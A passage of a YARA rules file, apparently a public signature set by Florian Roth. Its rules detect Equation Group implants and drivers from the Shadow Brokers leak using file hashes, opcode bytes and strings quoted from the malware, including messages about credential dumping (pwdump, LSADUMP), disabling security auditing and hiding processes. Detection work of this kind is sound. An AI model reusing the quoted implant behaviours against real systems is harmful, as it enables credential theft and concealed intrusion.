wide\n      $s2 = \"hNtQueryInformationProcess\" fullword ascii\n      $s3 = \"hZwOpenProcess\" fullword ascii\n      $s4 = \".?AVFeFinallyFailure@@\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and ( all of ( $s* ) ) ) or ( all of them )\n}\n\nrule EquationGroup_modifyAudit_Lp_RID325D : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file modifyAudit_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"2a1f2034e80421359e3bf65cbd12a55a95bd00f2eb86cf2c2d287711ee1d56ad\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Read of audit related process memory failed\" fullword wide\n      $s2 = \"** This may indicate that another copy of modify_audit is already running **\" fullword wide\n      $s3 = \"Pattern match of code failed\" fullword wide\n      $s4 = \"Base for necessary auditing dll not found\" fullword wide\n      $s5 = \"Security auditing has been disabled\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them ) or ( all of them )\n}\n\nrule EquationGroup_ProcessHide_Lp_RID3237 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file ProcessHide_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 13:55:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"cdee0daa816f179e74c90c850abd427fbfe0888dcfbc38bf21173f543cdcdc66\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invalid flag.  Can only hide or unhide\" fullword wide\n      $x2 = \"Process elevation failed\" fullword wide\n      $x3 = \"Unknown error hiding process\" fullword wide\n      $x4 = \"Invalid process links found in EPROCESS\" fullword wide\n      $x5 = \"Unable to find SYSTEM process\" fullword wide\n      $x6 = \"Process hidden, but EPROCESS location lost\" fullword wide\n      $x7 = \"Invalid EPROCESS location for given ID\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them ) or ( 3 of them )\n}\n\nrule EquationGroup_pwdump_Implant_RID3294 : APT DEMO EXE FILE T1003 {\n   meta:\n      description = \"EquationGroup Malware - file pwdump_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:11:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"dfd5768a4825d1c7329c2e262fde27e2b3d9c810653585b058fcf9efa9815964\"\n      tags = \"APT, DEMO, EXE, FILE, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n      $s8 = \".?AVFeFinallySuccess@@\" fullword ascii\n      $s3 = \"\\\\system32\\\\win32k.sys\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}\n\nrule EquationGroup_EquationDrug_Gen_5_RID33A8 : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level3_http_dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:57:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"4ebfc1f6ec6a0e68e47e5b231331470a4483184cf715a578191b91ba7c32094d\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Psxssdll.dll\" fullword wide\n      $s2 = \"Posix Server Dll\" fullword wide\n      $s3 = \"itanium\" fullword wide\n      $s6 = \"Copyright (C) Microsoft\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_PC_Level3_http_flav_dll_RID35A2 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level3_http_flav_dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 16:21:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"27972d636b05a794d17cb3203d537bcf7c379fafd1802792e7fb8e72f130a0c4\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Psxssdll.dll\" fullword wide\n      $s2 = \"Posix Server Dll\" fullword wide\n      $s4 = \"itanium\" fullword wide\n      $s5 = \"RHTTP/1.0\" fullword wide\n      $s8 = \"Copyright (C) Microsoft\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_LSADUMP_Lp_RID2FF4 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file LSADUMP_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 12:19:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"c7bf4c012293e7de56d86f4f5b4eeb6c1c5263568cc4d9863a286a86b5daf194\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"LSADUMP - - ERROR - - Injected\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}\n\nrule EquationGroup_EquationDrug_mstcp32_RID3486 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file mstcp32.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 15:34:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"26215bc56dc31d2466d72f1f4e1b6388e62606e9949bc41c28968fcb9a9d60a6\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mstcp32.sys\" fullword wide\n      $s2 = \"p32.sys\" fullword ascii\n      $s3 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" wide\n      $s4 = \"\\\\DosDevices\\\\%ws\" wide\n      $s5 = \"\\\\Device\\\\%ws_%ws\" wide\n      $s6 = \"sys\\\\mstcp32.dbg\" fullword ascii\n      $s7 = \"%ws%03d%ws%wZ\" fullword wide\n      $s8 = \"TCP/IP driver\" fullword wide\n      $s9 = \"\\\\Device\\\\%ws\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 7 of them ) or ( all of them )\n}\n\nrule EquationGroup_nethide_Lp_RID30BF : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file nethide_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 12:53:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"137749c0fbb8c12d1a650f0bfc73be2739ff084165d02e4cb68c6496d828bf1d\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Error: Attempt to hide all TCP connections (any:any).\" fullword wide\n      $x2 = \"privilegeRunInKernelMode failed\" fullword wide\n      $x3 = \"Failed to unhide requested connection\" fullword wide\n      $x4 = \"Nethide running in USER_MODE\" fullword wide\n      $x5 = \"Not enough slots for all of the list.  Some entries may have not been hidden.\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them ) or ( all of them )\n}\n\nrule EquationGroup_PC_Level4_flav_dll_x64_RID34C5 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level4_flav_dll_x64\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 15:44:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"25a2549031cb97b8a3b569b1263c903c6c0247f7fff866e7ec63f0add1b4921c\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wship.dll\" fullword wide\n      $s2 = \"   IP:      \" fullword ascii\n      $s3 = \"\\\\\\\\.\\\\%hs\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_PC_Level4_flav_exe_RID338A : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level4_flav_exe\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:52:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"33ba9f103186b6e52d8d69499512e7fbac9096e7c5278838127488acc3b669a9\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Extended Memory Runtime Process\" fullword wide\n      $s2 = \"memess.exe\" fullword wide\n      $s3 = \"\\\\\\\\.\\\\%hs\" fullword ascii\n      $s4 = \".?AVOpenSocket@@\" fullword ascii\n      $s5 = \"Corporation. All rights reserved.\" fullword wide\n      $s6 = \"itanium\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_processinfo_Implant_RID34A2 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file processinfo_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 15:38:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"aadfa0b1aec4456b10e4fb82f5cfa918dbf4e87d19a02bcc576ac499dda0fb68\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"hZwOpenProcessToken\" fullword ascii\n      $s2 = \"hNtQueryInformationProcess\" fullword ascii\n      $s3 = \"No mapping\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}\n\nrule EquationGroup_EquationDrug_Gen_2_RID33A5 : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"EquationGroup Malware - file PortMap_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:56:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"964762416840738b1235ed4ae479a4b117b8cdcc762a6737e83bc2062c0cf236\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 0c 2b ca 8a 04 11 3a 02 75 01 47 42 4e 75 f4 8b } \n      $op2 = { 14 83 c1 05 80 39 85 75 0c 80 79 01 c0 75 06 80 } \n      $op3 = { eb 3d 83 c0 06 33 f6 80 38 ff 75 2c 80 78 01 15 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them )\n}\n\nrule EquationGroup_EquationDrug_ntevt_RID342B : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file ntevt.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 15:19:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"45e5e1ea3456d7852f5c610c7f4447776b9f15b56df7e3a53d57996123e0cebf\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ntevt.sys\" fullword ascii\n      $s2 = \"c:\\\\ntevt.pdb\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )\n}\n\nrule EquationGroup_nethide_Implant_RID32D8 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file nethide_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:22:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"b2daf9058fdc5e2affd5a409aebb90343ddde4239331d3de8edabeafdb3a48fa\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\dlcndi\" fullword ascii\n      $s2 = \"s\\\\drivers\\\\\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and all of them )\n}\n\nrule EquationGroup_EquationDrug_Gen_4_RID33A7 : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level4_flav_dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:57:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"227faeb770ba538fb85692b3dfcd00f76a0a5205d1594bd0969a1e535ee90ee1\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 11 8b da 23 df 8d 1c 9e c1 fb 02 33 da 23 df 33 } \n      $op2 = { c3 0c 57 8b 3b eb 27 8b f7 83 7e 08 00 8b 3f 74 } \n      $op3 = { 00 0f b7 5e 14 8d 5c 33 18 8b c3 2b 45 08 50 ff } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_EquationDrug_tdi6_RID3371 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file tdi6.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:48:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"12c082f74c0916a0e926488642236de3a12072a18d29c97bead15bb301f4b3f8\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"tdi6.sys\" fullword wide\n      $s3 = \"TDI IPv6 Wrapper\" fullword wide\n      $s5 = \"Corporation. All rights reserved.\" fullword wide\n      $s6 = \"FailAction\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}\n\nrule EquationGroup_modifyAuthentication_Implant_RID383F : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file modifyAuthentication_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 18:13:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"e1dff24af5bfc991dca21b4e3a19ffbc069176d674179eef691afc6b1ac6f805\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LSASS.EXE\" fullword wide\n      $s2 = \"hsamsrv.dll\" fullword ascii\n      $s3 = \"hZwOpenProcess\" fullword ascii\n      $s4 = \"hOpenProcess\" fullword ascii\n      $s5 = \".?AVFeFinallyFailure@@\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_ntfltmgr_RID3031 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file ntfltmgr.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 12:29:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"f7a886ee10ee6f9c6be48c20f370514be62a3fd2da828b0dff44ff3d485ff5c5\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ntfltmgr.sys\" fullword wide\n      $s2 = \"ntfltmgr.pdb\" fullword ascii\n      $s4 = \"Network Filter Manager\" fullword wide\n      $s5 = \"Corporation. All rights reserved.\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}\n\nrule EquationGroup_DXGHLP16_RID2EF1 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file DXGHLP16.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 11:36:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"fcfb56fa79d2383d34c471ef439314edc2239d632a880aa2de3cea430f6b5665\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"DXGHLP16.SYS\" fullword wide\n      $s2 = \"P16.SYS\" fullword ascii\n      $s3 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" wide\n      $s4 = \"\\\\DosDevices\\\\%ws\" wide\n      $s5 = \"\\\\Device\\\\%ws_%ws\" wide\n      $s6 = \"ct@SYS\\\\DXGHLP16.dbg\" fullword ascii\n      $s7 = \"%ws%03d%ws%wZ\" fullword wide\n      $s8 = \"TCP/IP driver\" fullword wide\n      $s9 = \"\\\\Device\\\\%ws\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_EquationDrug_msgkd_RID3410 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file msgkd.ex_\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 15:14:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"25eec68fc9f0d8d1b5d72c9eae7bee29035918e9dcbeab13e276dec4b2ad2a56\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"KEysud\" fullword ascii\n      $s2 = \"XWWWPWS\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_RunAsChild_Lp_RID31AB : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file RunAsChild_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 13:32:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"1097e1d562341858e241f1f67788534c0e340a2dc2e75237d57e3f473e024464\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Privilege elevation failed\" fullword wide\n      $s2 = \"Unable to open parent process\" fullword wide\n      $s4 = \"Invalid input to lpRunAsChildPPC\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_EquationDrug_Gen_6_RID33A9 : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level3_dll_x64\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:57:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"339855618fb3ef53987b8c14a61bd4519b2616e766149e0c21cbd7cbe7a632c9\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Psxssdll.dll\" fullword wide\n      $s2 = \"Posix Server Dll\" fullword wide\n      $s3 = \"Copyright (C) Microsoft\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_PC_Level3_http_flav_dll_x64_RID36E3 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level3_http_flav_dll_x64\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 17:15:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"4e0209b4f5990148f5d6dee47dbc7021bf78a782b85cef4d6c8be22d698b884f\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Psxssdll.dll\" fullword wide\n      $s2 = \"Posix Server Dll\" fullword wide\n      $s3 = \".?AVOpenSocket@@\" fullword ascii\n      $s4 = \"RHTTP/1.0\" fullword wide\n      $s5 = \"Copyright (C) Microsoft\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( all of ( $s* ) ) ) or ( all of them )\n}\n\nrule EquationGroup_EquationDrug_Gen_3_RID33A6 : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"EquationGroup Malware - file mssld.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:56:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"69dcc150468f7707cc8ef618a4cea4643a817171babfba9290395ada9611c63c\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 } \n      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 } \n      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}\n\nrule EquationGroup_GetAdmin_Lp_RID30E7 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file GetAdmin_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 12:59:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"e1c9c9f031d902e69e42f684ae5b35a2513f7d5f8bca83dfbab10e8de6254c78\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Current user is System -- unable to join administrators group\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_ModifyGroup_Lp_RID3253 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file ModifyGroup_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:00:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"dfb38ed2ca3870faf351df1bd447a3dc4470ed568553bf83df07bf07967bf520\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Modify Privileges failed\" fullword wide\n      $s2 = \"Given privilege name not found\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_pwdump_Lp_RID307B : APT DEMO EXE FILE T1003 {\n   meta:\n      description = \"EquationGroup Malware - file pwdump_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 12:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"fda57a2ba99bc610d3ff71b2d0ea2829915eabca168df99709a8fdd24288c5e5\"\n      tags = \"APT, DEMO, EXE, FILE, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"PWDUMP - - ERROR - -\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_EventLogEdit_Implant_RID34A1 : APT DEMO EXE FILE T1543_003 {\n   meta:\n      description = \"EquationGroup Malware - file EventLogEdit_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 15:38:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"0bb750195fbd93d174c2a8e20bcbcae4efefc881f7961fdca8fa6ebd68ac1edf\"\n      tags = \"APT, DEMO, EXE, FILE, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\EventLog\\\\%ls\" fullword wide\n      $s2 = \"Ntdll.dll\" fullword ascii\n      $s3 = \"hZwOpenProcess\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}\n\nrule EquationGroup_PortMap_Lp_RID30A1 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file PortMap_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 12:48:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"2b27f2faae9de6330f17f60a1d19f9831336f57fdfef06c3b8876498882624a6\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Privilege elevation failed\" fullword wide\n      $s2 = \"Portmap ended due to max number of ports\" fullword wide\n      $s3 = \"Invalid parameters received for portmap\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them )\n}\n\nrule EquationGroup_ProcessOptions_Lp_RID33A9 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file ProcessOptions_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 14:57:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC 